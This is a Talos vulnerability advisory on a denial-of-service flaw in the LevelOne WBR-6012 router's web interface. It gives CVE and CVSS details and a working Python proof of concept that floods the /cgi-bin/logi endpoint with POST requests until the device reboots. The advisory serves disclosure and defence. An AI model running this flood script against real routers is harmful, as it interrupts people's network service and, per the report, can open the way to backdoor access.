# Talos Vulnerability Report

### TALOS-2024-1982

## LevelOne WBR-6012 Web Application improper resource allocation vulnerability

##### October 30, 2024

##### CVE Number

CVE-2024-31152

##### SUMMARY

The LevelOne WBR-6012 router with firmware R0.40e6 is vulnerable to improper resource allocation within its web application, where a series of crafted HTTP requests can cause a reboot. This could lead to network service interruptions.

##### CONFIRMED VULNERABLE VERSIONS

The versions below were either tested or verified to be vulnerable by Talos or confirmed to be vulnerable by the vendor.

LevelOne WBR-6012 R0.40e6

##### PRODUCT URLS

WBR-6012 - <https://us.level1.com/products/wbr-6012>

##### CVSSv3 SCORE

5.3 - CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L

##### CWE

CWE-400 - Uncontrolled Resource Consumption

##### DETAILS

The WBR-6012 is a wireless SOHO router. It is a low-cost device which functions as an internet gateway for homes and small offices while aiming to be easy to configure and operate. In addition to providing a WiFi access point, the device serves as a 4-port wired router and implements a variety of common SOHO router capabilities such as port forwarding, quality-of-service, web-based administration, a DHCP server, a basic DMZ, and UPnP capabilities.

The LevelOne WBR-6012 router’s web application is vulnerable to a flood-based denial of service attack due to insufficient rate-limiting measures, which allows attackers to overwhelm the system with a deluge of requests, leading to service disruption. A flood of valid HTTP POST requests to the /cgi-bin/logi endpoint results in a crash and reboot, enabling backdoor access (TALOS-2024-1979).

### Exploit Proof of Concept

Sending the below 100-140 times in quick succession, sometimes this only takes ~100 requests, sometimes it’s closer to 1,200.

```
import requests

url = 'http://192.168.1.1/cgi-bin/logi'

for i in range(2000):
    i = str(i)
    data = {'PS': 'test',
        #  'rc': '=%40',
            'rd': 'status',
        # 'TC': '1707304321.99'
        }
    response = str(requests.post(url, data=data).status_code)

    print('req: ' + str(i) + '\tResp Code: ' + response)

POST /cgi-bin/logi HTTP/1.1
Host: 192.168.1.1
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 17
Content-Type: application/x-www-form-urlencoded

PS=test&rd=status

```
